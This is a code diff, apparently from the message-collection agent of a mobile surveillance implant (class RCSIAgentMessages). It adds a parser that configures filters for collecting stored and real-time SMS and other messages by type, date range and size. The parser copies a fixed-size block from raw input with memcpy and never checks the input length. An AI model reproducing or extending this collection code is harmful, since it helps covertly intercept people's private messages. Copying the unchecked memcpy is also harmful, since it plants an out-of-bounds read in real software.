@@ -1293,14 +1293,14 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
                 }
             }
         }
-    else if (msgFilter == REALTTIME_FILTER_TYPE)
-      {
-        @synchronized(self)
-          {
-          if (mSMS > 0)
-            mSMS--;
-          }
-      }     
+      else if (msgFilter == REALTTIME_FILTER_TYPE)
+        {
+          @synchronized(self)
+            {
+            if (mSMS > 0)
+              mSMS--;
+            }
+        }     
     
       [anObject release];
     }
@@ -1697,6 +1697,88 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
   return YES;
 }
 
+typedef struct _message_config_t {
+  int type;
+  int enable;
+  int history;
+  int64_t datefrom;
+  int64_t dateto;
+  int maxsize;
+} message_config_t;
+
+- (BOOL)_parseJsonConfWithData: (id)rawData
+{
+  message_config_t param[3];
+  
+  if (rawData == nil)
+    return FALSE;
+  memcpy(param, [rawData bytes], sizeof(param));
+  
+  for (int i=0; i < 3; i++)
+    {
+      if (param[i].enable == TRUE)
+        {
+          NSNumber *filterType      = [[NSNumber alloc] initWithInt: COLLECT_FILTER_TYPE];
+          NSNumber *msgType         = [[NSNumber alloc] initWithInt:  param[i].type];
+          NSNumber *uxFromDateTime  = [[NSNumber alloc] initWithLong: param[i].datefrom];
+          NSNumber *uxToDateTime    = [[NSNumber alloc] initWithLong: param[i].dateto];
+          NSNumber *maxMessageSize  = [[NSNumber alloc] initWithLong: param[i].maxsize];
+          NSMutableArray *keyWordArray = [NSMutableArray arrayWithCapacity: 0];
+                
+          NSArray *keys = [NSArray arrayWithObjects: @"filterType", 
+                                                     @"messageType",
+                                                     @"keyWords",
+                                                     @"fromDate",
+                                                     @"toDate",
+                                                     @"maxMessageSize",
+                                                     nil];
+          
+          NSArray *objects = [NSArray arrayWithObjects: filterType, 
+                                                        msgType,
+                                                        keyWordArray,
+                                                        uxFromDateTime,
+                                                        uxToDateTime,
+                                                        maxMessageSize,
+                                                        nil];
+          
+          NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects 
+                                                                 forKeys: keys];
+          
+          [mMessageFilters addObject: (id)dictionary];
+        
+          filterType      = [[NSNumber alloc] initWithInt: REALTTIME_FILTER_TYPE];
+          msgType         = [[NSNumber alloc] initWithInt:  param[i].type];
+          uxFromDateTime  = [[NSNumber alloc] initWithLong: 0];
+          uxToDateTime    = [[NSNumber alloc] initWithLong: 0];
+          maxMessageSize  = [[NSNumber alloc] initWithLong: param[i].maxsize];
+          keyWordArray = [NSMutableArray arrayWithCapacity: 0];
+          
+          NSArray *keys_r = [NSArray arrayWithObjects: @"filterType", 
+                                                       @"messageType",
+                                                       @"keyWords",
+                                                       @"fromDate",
+                                                       @"toDate",
+                                                       @"maxMessageSize",
+                                                       nil];
+          
+          NSArray *objects_r = [NSArray arrayWithObjects: filterType, 
+                                                          msgType,
+                                                          keyWordArray,
+                                                          uxFromDateTime,
+                                                          uxToDateTime,
+                                                          maxMessageSize,
+                                                          nil];
+          
+          NSDictionary *dictionary_r = [NSDictionary dictionaryWithObjects: objects_r 
+                                                                   forKeys: keys_r];
+          
+          [mMessageFilters addObject: (id)dictionary_r];
+        }
+    }
+    
+  return TRUE;
+}
+
 @end
 
 @implementation RCSIAgentMessages 
@@ -1828,7 +1910,7 @@ static void MsgNotificationCallback (CFNotificationCenterRef center,
         asctime(gmtime((time_t *)&mFirstCollectorSMS)), mFirstCollectorSMS, asctime(gmtime((time_t *)&mLastCollectorSMS)), mLastCollectorSMS);
 #endif
   
-  if([self _parseConfWithData: messageRawData] == NO)
+  if([self _parseJsonConfWithData: messageRawData] == NO)
     {
 #ifdef DEBUG
       NSLog(@"start: AgentMessages configuration error!");
